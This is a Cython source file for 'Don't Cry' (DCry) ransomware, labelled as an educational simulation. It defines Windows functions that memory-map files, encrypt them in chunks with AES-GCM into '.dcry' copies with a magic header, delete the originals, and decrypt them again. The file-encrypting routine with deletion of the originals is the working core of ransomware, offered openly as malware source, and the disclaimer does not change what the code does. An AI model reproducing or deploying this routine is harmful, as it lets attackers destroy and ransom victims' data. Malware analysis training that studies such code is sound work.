################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics behavior of real ransomware but must NOT be used for illegal or 
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM) 
# under supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

import os
cimport cython
from libc.stdlib cimport malloc, free
from libc.stdio cimport remove

from colorama import Fore
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

cdef extern from "windows.h":
    ctypedef unsigned long DWORD
    ctypedef void* HANDLE
    ctypedef void* LPVOID
    ctypedef unsigned long long ULONGLONG

    ctypedef union LARGE_INTEGER:
        ULONGLONG QuadPart

    cdef HANDLE INVALID_HANDLE_VALUE
    cdef DWORD GENERIC_READ
    cdef DWORD OPEN_EXISTING
    cdef DWORD PAGE_READONLY
    cdef DWORD FILE_MAP_READ
    cdef void* NULL

    HANDLE CreateFileA(char* lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, void* lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
    bint CloseHandle(HANDLE hObject)
    HANDLE CreateFileMappingA(HANDLE hFile, void* lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, char* lpName)
    LPVOID MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, size_t dwNumberOfBytesToMap)
    bint UnmapViewOfFile(LPVOID lpBaseAddress)
    bint GetFileSizeEx(HANDLE hFile, LARGE_INTEGER* lpFileSize)

cdef long long CHUNK_SIZE = 8 * 1024 ** 2

@cython.boundscheck(False)
@cython.wraparound(False)
@cython.cdivision(True)
def encrypt_file(str path, bytes key):
    cdef:
        bytes MAGIC = b"DCRY$"
        str encrypted_path = path + ".dcry"
        bint success = False
        bytes nonce_bytes, encrypted_chunk, tag

        HANDLE h_file = INVALID_HANDLE_VALUE
        HANDLE h_map = NULL
        char* mapped_view = NULL
        LARGE_INTEGER file_size
        long long offset = 0

    try:
        h_file = CreateFileA(path.encode('utf-8'), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL)
        if h_file == INVALID_HANDLE_VALUE:
            return

        if not GetFileSizeEx(h_file, &file_size):
            return

        if file_size.QuadPart == 0:
            return

        h_map = CreateFileMappingA(h_file, NULL, PAGE_READONLY, 0, 0, NULL)
        if h_map == NULL:
            return

        mapped_view = <char*>MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0)
        if mapped_view == NULL:
            return

        with open(encrypted_path, "wb") as f_out:
            f_out.write(MAGIC)
            
            while offset < file_size.QuadPart:
                chunk_size = min(CHUNK_SIZE, file_size.QuadPart - offset)
                
                nonce_bytes = get_random_bytes(12)
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce_bytes)
                
                encrypted_chunk, tag = cipher.encrypt_and_digest(mapped_view[offset : offset + chunk_size])
                
                f_out.write(nonce_bytes)
                f_out.write(tag)
                f_out.write(encrypted_chunk)
                
                offset += chunk_size
        
        success = True
    finally:
        if mapped_view != NULL: UnmapViewOfFile(mapped_view)
        if h_map != NULL: CloseHandle(h_map)
        if h_file != INVALID_HANDLE_VALUE: CloseHandle(h_file)
        
        if success:
            try:
                os.remove(path)
            except OSError:
                pass

@cython.boundscheck(False)
@cython.wraparound(False)
@cython.cdivision(True)
def decrypt_file(str path, bytes key):
    cdef:
        bytes MAGIC = b"DCRY$"
        str decrypted_path = os.path.splitext(path)[0]
        bint success = False
        bytes nonce_read, tag_read, encrypted_data, decrypted_chunk
        long long header_size = len(MAGIC)
        long long chunk_header_size = 12 + 16

        HANDLE h_file = INVALID_HANDLE_VALUE
        HANDLE h_map = NULL
        char* mapped_view = NULL
        LARGE_INTEGER file_size
        long long offset = header_size

    try:
        h_file = CreateFileA(path.encode('utf-8'), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL)
        if h_file == INVALID_HANDLE_VALUE: return

        if not GetFileSizeEx(h_file, &file_size) or file_size.QuadPart < header_size:
            return

        h_map = CreateFileMappingA(h_file, NULL, PAGE_READONLY, 0, 0, NULL)
        if h_map == NULL: return

        mapped_view = <char*>MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0)
        if mapped_view == NULL: return

        if mapped_view[:len(MAGIC)] != MAGIC:
            return

        with open(decrypted_path, "wb") as f_out:
            while offset < file_size.QuadPart:
                nonce_read = mapped_view[offset : offset + 12]
                tag_read = mapped_view[offset + 12 : offset + chunk_header_size]
                
                encrypted_data_size = min(CHUNK_SIZE, file_size.QuadPart - (offset + chunk_header_size))
                encrypted_data = mapped_view[offset + chunk_header_size : offset + chunk_header_size + encrypted_data_size]

                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce_read)
                try:
                    decrypted_chunk = cipher.decrypt_and_verify(encrypted_data, tag_read)
                except ValueError:
                    print(f"{Fore.LIGHTRED_EX}Authentication failed for a chunk in {path} - File may be tampered!")
                    f_out.close()
                    os.remove(decrypted_path)
                    return

                f_out.write(decrypted_chunk)
                offset += chunk_header_size + len(encrypted_data)
        
        success = True
    finally:
        if mapped_view != NULL: UnmapViewOfFile(mapped_view)
        if h_map != NULL: CloseHandle(h_map)
        if h_file != INVALID_HANDLE_VALUE: CloseHandle(h_file)

        if success:
            try:
                os.remove(path)
            except OSError:
                pass
